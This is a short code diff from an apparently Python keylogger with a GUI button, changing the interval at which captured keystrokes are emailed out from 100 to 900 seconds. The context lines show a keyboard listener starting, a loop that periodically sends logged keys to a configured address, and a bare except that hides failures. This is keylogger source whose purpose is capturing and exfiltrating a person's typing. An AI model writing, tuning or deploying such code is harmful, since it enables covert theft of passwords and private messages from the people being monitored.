@@ -132,7 +132,7 @@ listener = Listener(on_press=on_press)
 # Function to start keylogger
 def start_logger():
     global listener, toAddr, btnStr
-    count = 100
+    count = 900
     listener.start()
     btnStr.set("Stop Keylogger")
     while True:
@@ -149,7 +149,7 @@ def start_logger():
                     send_email(keys_information, keys_information, toAddr)
                 except:
                     pass
-            count = 100
+            count = 900
         sleep(1)
         count -= 1
     listener.stop()
